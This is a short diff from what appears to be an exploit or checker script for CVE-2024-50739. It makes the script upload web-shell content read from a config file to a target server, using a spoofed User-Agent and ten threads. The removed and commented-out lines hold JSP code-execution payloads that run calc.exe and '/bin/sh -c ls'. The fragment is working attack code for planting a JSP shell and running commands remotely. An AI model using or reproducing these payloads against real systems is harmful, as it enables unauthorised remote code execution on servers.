@@ -43,7 +43,11 @@ def check_cve_2024_50739(url, config):
         headers2 = {
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
         }
-        payload_put = "aa<% Runtime.getRuntime().exec(\"calc.exe\");%>"
+        # payload_put = "aa<% Runtime.getRuntime().exec(\"calc.exe\");%>"
+        # Process process = Runtime.getRuntime().exec(new String[]{" /bin/sh -c ls /usr/local"});
+        # payload_put = "aa<% Runtime.getRuntime().exec(\"bin/sh -c ls -al /usr \");%>"
+        shell_file_content = config['files'].get('shell_file_content', '<%-- 默认的 shell 内容 --%>')
+        payload_put = "aa" + shell_file_content
 
         # 增加线程
         with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
